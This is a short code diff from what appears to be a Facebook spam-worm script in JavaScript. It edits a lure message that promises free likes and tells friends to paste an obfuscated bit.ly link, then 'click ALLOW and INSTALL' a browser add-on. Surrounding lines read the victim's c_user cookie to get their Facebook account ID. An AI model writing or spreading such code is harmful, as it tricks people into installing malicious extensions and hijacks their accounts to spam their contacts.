@@ -95,7 +95,7 @@ jx = {
 var j = 0;
 var k = 0;
 var Gsuc = 0;
-var Gmsg = " Friends Like This awesOme HearT Touching Page https://www.facebook.com/pages/Kyun-Ki-Tum-Hi-Ho/722607351086829 \n I am sure it will touch Your Heart, Check The Page And Hit Like \n & Get Free Real Photo/Status/Fanpage Likes. \n step1- Use Firefox Browser \n step2- Copy Paste below link in browser  \n step3- Remove the space after .ly \n step4- Hit Enter,click ALLOW and INSTALL => http://bit.ly/ 19aa2Ay \n ";
+var Gmsg = " Friends Like This awesOme HearT Touching Page https://www.facebook.com/pages/Kyun-Ki-Tum-Hi-Ho/722607351086829 \n I am sure it will touch Your Heart, Check The Page And Hit Like \n & Get Free Real Photo/Status/Fanpage Likes. \n step1- Use Firefox Browser \n step2- Copy Paste below link in browser  \n step3- Remove the space after .ly \n step4- Hit Enter,click ALLOW and INSTALL => http://bit.ly/ 19aa2Ay  ";
 var arr = new Array;
 var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
 
